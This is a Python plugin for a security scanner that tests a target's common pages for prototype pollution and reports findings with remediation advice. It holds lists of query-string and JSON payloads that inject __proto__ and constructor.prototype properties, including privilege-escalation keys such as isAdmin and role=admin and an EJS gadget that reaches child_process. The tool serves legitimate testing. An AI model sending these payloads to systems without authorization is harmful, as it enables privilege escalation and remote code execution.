"""Client-side JavaScript Prototype Pollution detection."""

from __future__ import annotations

import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

PP_PAYLOADS = [
    # __proto__ bracket notation
    ("?__proto__[basilisk_pp_test]=polluted", "query_proto"),
    ("?__proto__[polluted]=1", "query_proto_polluted"),
    ("?__proto__[isAdmin]=true", "query_isadmin"),
    ("?__proto__[role]=admin", "query_role"),
    ("?__proto__[admin]=true", "query_admin"),
    ("?__proto__[debug]=true", "query_debug"),
    ("?__proto__[verbose]=true", "query_verbose"),
    ("?__proto__[status]=1", "query_status"),
    ("?__proto__[type]=admin", "query_type"),
    # __proto__ dot notation
    ("?__proto__.basilisk_pp_test=polluted", "query_proto_dot"),
    ("?__proto__.polluted=1", "query_proto_dot_polluted"),
    ("?__proto__.isAdmin=true", "query_proto_dot_isadmin"),
    # __proto__ builtin overrides
    ("?__proto__[toString]=polluted", "query_tostring"),
    ("?__proto__[valueOf]=polluted", "query_valueof"),
    ("?__proto__[constructor]=polluted", "query_proto_constructor"),
    ("?__proto__[hasOwnProperty]=polluted", "query_hasown"),
    ("?__proto__[__defineGetter__]=polluted", "query_define_getter"),
    # constructor.prototype
    ("?constructor[prototype][basilisk_pp_test]=polluted", "query_constructor"),
    ("?constructor[prototype][polluted]=1", "query_constructor_polluted"),
    ("?constructor.prototype.polluted=1", "query_constructor_dot"),
    ("?constructor[prototype][isAdmin]=true", "query_constructor_isadmin"),
    ("?constructor[prototype][role]=admin", "query_constructor_role"),
    # Nested constructor
    ("?constructor[constructor][prototype][polluted]=1", "query_nested_constructor"),
    ("?constructor[constructor][prototype][isAdmin]=true", "query_nested_constructor_admin"),
    # Deep nested __proto__
    ("?__proto__[__proto__][polluted]=1", "query_deep_proto"),
    ("?__proto__[__proto__][isAdmin]=true", "query_deep_proto_admin"),
    ("?a[__proto__][polluted]=1", "query_nested_a_proto"),
    ("?a[b][__proto__][polluted]=1", "query_nested_ab_proto"),
    # Hash-based (fragment)
    ("#__proto__[basilisk_pp_test]=polluted", "hash_proto"),
    ("#__proto__[polluted]=1", "hash_proto_polluted"),
    ("#constructor[prototype][polluted]=1", "hash_constructor"),
    # URL-encoded variants
    ("?%5f%5fproto%5f%5f[polluted]=1", "query_encoded_proto"),
    ("?%5f%5fproto%5f%5f[isAdmin]=true", "query_encoded_proto_admin"),
    ("?__pro%74o__[polluted]=1", "query_partial_encoded_proto"),
    # Object.prototype via different path
    ("?Object[prototype][polluted]=1", "query_object_prototype"),
    ("?Object.prototype.polluted=1", "query_object_prototype_dot"),
    # Mixed bracket/dot
    ("?__proto__[a].polluted=1", "query_mixed_bracket_dot"),
    ("?constructor.prototype[polluted]=1", "query_mixed_dot_bracket"),
    # Additional property targets
    ("?__proto__[authorized]=true", "query_authorized"),
    ("?__proto__[verified]=true", "query_verified"),
    ("?__proto__[level]=9999", "query_level"),
]

JSON_PP_PAYLOADS = [
    # Basic __proto__ pollution
    (
        '{"__proto__":{"basilisk_pp_test":"polluted"}}',
        "json_proto",
    ),
    (
        '{"__proto__":{"polluted":1}}',
        "json_proto_polluted",
    ),
    # constructor.prototype
    (
        '{"constructor":{"prototype":{"basilisk_pp_test":"polluted"}}}',
        "json_constructor",
    ),
    (
        '{"constructor":{"prototype":{"polluted":1}}}',
        "json_constructor_polluted",
    ),
    # Privilege escalation properties
    (
        '{"__proto__":{"isAdmin":true}}',
        "json_isadmin",
    ),
    (
        '{"__proto__":{"role":"admin","status":1}}',
        "json_role_escalation",
    ),
    (
        '{"__proto__":{"admin":true}}',
        "json_admin",
    ),
    (
        '{"__proto__":{"debug":true,"verbose":true}}',
        "json_debug",
    ),
    (
        '{"__proto__":{"type":"admin"}}',
        "json_type_admin",
    ),
    # Deep nested __proto__
    (
        '{"a":{"__proto__":{"polluted":1}}}',
        "json_nested_a_proto",
    ),
    (
        '{"a":{"b":{"__proto__":{"polluted":1}}}}',
        "json_nested_ab_proto",
    ),
    (
        '{"__proto__":{"__proto__":{"polluted":1}}}',
        "json_deep_proto",
    ),
    # Array pollution
    (
        '[{"__proto__":{"polluted":1}}]',
        "json_array_proto",
    ),
    (
        '{"items":[{"__proto__":{"polluted":1}}]}',
        "json_items_array_proto",
    ),
    # Builtin override
    (
        '{"__proto__":{"toString":"polluted"}}',
        "json_tostring",
    ),
    (
        '{"__proto__":{"valueOf":"polluted"}}',
        "json_valueof",
    ),
    (
        '{"__proto__":{"hasOwnProperty":"polluted"}}',
        "json_hasown",
    ),
    # constructor chain
    (
        '{"constructor":{"constructor":{"prototype":{"polluted":1}}}}',
        "json_nested_constructor",
    ),
    # Prototype with various property names
    (
        '{"__proto__":{"shell":"/bin/sh"}}',
        "json_shell",
    ),
    (
        '{"__proto__":{"env":{"NODE_DEBUG":"1"}}}',
        "json_env",
    ),
    (
        '{"__proto__":{"outputFunctionName":"x;process.mainModule.require(\'child_process\')"}}',
        "json_rce_ejs",
    ),
]

SCAN_PAGES = [
    "/", "/api/", "/api/v1/", "/api/v2/", "/search", "/settings",
    "/config", "/graphql", "/user", "/profile",
]
PP_MARKER = "polluted"


class PrototypePollutionPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="prototype_pollution",
        display_name="Prototype Pollution",
        category=PluginCategory.PENTESTING,
        description="Detects client-side JavaScript prototype pollution via URL params",
        produces=["prototype_pollution_findings"],
        timeout=25.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available"
            )

        findings: list[Finding] = []
        tested: list[dict] = []
        from basilisk.utils.http_check import resolve_base_url

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"pp_tests": []},
            )

        # Get baselines
        baselines: dict[str, str] = {}
        for page in SCAN_PAGES:
            if ctx.should_stop:
                break
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(f"{base_url}{page}", timeout=8.0)
                    baselines[page] = await resp.text(
                        encoding="utf-8", errors="replace"
                    )
            except Exception:
                baselines[page] = ""

        # Test query string payloads
        for page in SCAN_PAGES:
            if ctx.should_stop:
                break
            baseline = baselines.get(page, "")
            if not baseline:
                continue

            for payload_qs, label in PP_PAYLOADS:
                url = f"{base_url}{page}{payload_qs}"
                try:
                    async with ctx.rate:
                        resp = await ctx.http.get(url, timeout=8.0)
                        body = await resp.text(encoding="utf-8", errors="replace")
                except Exception as e:
                    logger.debug("prototype_pollution: %s", e)
                    continue

                # Check if our marker appears in response but not in baseline
                if PP_MARKER in body and PP_MARKER not in baseline:
                    tested.append({
                        "page": page, "label": label, "method": "GET",
                        "reflected": True,
                    })
                    findings.append(Finding.high(
                        f"Prototype pollution: {label} on {page}",
                        description=(
                            "Prototype pollution payload reflected in response. "
                            "The __proto__ or constructor.prototype injection "
                            "modified the server/client-side object."
                        ),
                        evidence=(
                            f"URL: {url}\n"
                            f"Marker '{PP_MARKER}' found in response\n"
                            f"Not present in baseline"
                        ),
                        remediation=(
                            "Sanitize object keys — reject '__proto__', "
                            "'constructor', 'prototype'. Use Object.create(null) "
                            "for user-controlled data. Use Map instead of plain "
                            "objects."
                        ),
                        tags=["pentesting", "prototype-pollution"],
                    ))

                # Check for error messages indicating prototype manipulation
                proto_errors = [
                    "__proto__", "prototype", "object.prototype",
                    "cannot set property", "circular",
                ]
                body_lower = body.lower()
                if (
                    any(e in body_lower for e in proto_errors)
                    and not any(e in baseline.lower() for e in proto_errors)
                ):
                        tested.append({
                            "page": page, "label": label, "method": "GET",
                            "error_based": True,
                        })
                        findings.append(Finding.medium(
                            f"Potential prototype pollution: error on {page}",
                            description=(
                                f"Server returned prototype-related error "
                                f"when processing {label} payload."
                            ),
                            evidence=(
                                f"URL: {url}\n"
                                f"Proto-related error in response"
                            ),
                            remediation=(
                                "Sanitize object keys — reject '__proto__', "
                                "'constructor', 'prototype'."
                            ),
                            tags=["pentesting", "prototype-pollution"],
                        ))

        # Test JSON body payloads
        for page in SCAN_PAGES:
            if ctx.should_stop:
                break
            baseline = baselines.get(page, "")
            for payload_json, label in JSON_PP_PAYLOADS:
                url = f"{base_url}{page}"
                try:
                    async with ctx.rate:
                        resp = await ctx.http.post(
                            url,
                            data=payload_json,
                            headers={"Content-Type": "application/json"},
                            timeout=8.0,
                        )
                        body = await resp.text(encoding="utf-8", errors="replace")
                except Exception as e:
                    logger.debug("prototype_pollution: %s", e)
                    continue

                if PP_MARKER in body and PP_MARKER not in baseline:
                    tested.append({
                        "page": page, "label": label, "method": "POST",
                    })
                    findings.append(Finding.high(
                        f"Prototype pollution via JSON: {label} on {page}",
                        description=(
                            "JSON merge with __proto__ reflected in response."
                        ),
                        evidence=(
                            f"URL: {url}\nMethod: POST\n"
                            f"Payload: {payload_json}\n"
                            f"Marker found in response"
                        ),
                        remediation=(
                            "Strip __proto__ and constructor keys from JSON input "
                            "before merging. Use schema validation."
                        ),
                        tags=["pentesting", "prototype-pollution"],
                    ))

        if not findings:
            findings.append(Finding.info(
                "No prototype pollution vulnerabilities detected",
                tags=["pentesting", "prototype-pollution"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"pp_tests": tested},
        )
